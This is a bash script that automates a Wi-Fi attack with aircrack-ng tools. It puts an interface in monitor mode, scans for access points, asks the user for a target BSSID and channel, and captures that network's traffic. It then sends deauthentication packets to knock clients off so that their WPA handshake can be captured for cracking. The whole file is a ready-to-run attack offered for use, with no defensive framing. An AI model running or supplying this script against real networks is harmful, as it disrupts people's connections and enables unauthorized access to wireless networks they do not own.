#!/bin/bash

# Ensure script is run as root
if [ "$EUID" -ne 0 ]; then
  echo "[-] Please run this script with sudo."
  exit 1
fi

INTERFACE="wlan1mon"

echo "[+] Killing conflicting network processes..."
airmon-ng check kill

echo "[+] Looking for the target AP details. Please wait..."
echo "[!] Press CTRL+C ONLY after you see the target and have noted its BSSID and CH (Channel)."
echo ""
read -p "Press Enter to start scanning... " confirm
airodump-ng $INTERFACE

echo ""
read -p "[?] Enter the BSSID (MAC) of the target: " BSSID
read -p "[?] Enter the Channel (CH) of the target: " CHANNEL
echo ""

echo "[+] Starting target capture in the background..."
echo "[+] Capture files will be saved as 'captured_packet-01.cap'"
# Launch airodump-ng in the background
airodump-ng --bssid "$BSSID" -c "$CHANNEL" -w captured_packet $INTERFACE &
AIRODUMP_PID=$!

# Give airodump a moment to initialize
sleep 3

echo "[+] Sending deauthentication packets to force a handshake..."
aireplay-ng -0 7 -a "$BSSID" $INTERFACE

echo ""
echo "[!] Monitor the capture process above."
echo "[!] Look for 'WPA handshake' in the top right corner."
echo "[!] Once you see the handshake, press CTRL+C to stop the waiting and save the file."
echo ""

# Wait for the user to press Ctrl+C to terminate the background capture cleanly
trap "kill $AIRODUMP_PID; echo -e '\n[+] Capture stopped. Checking for files...'; exit" INT
wait
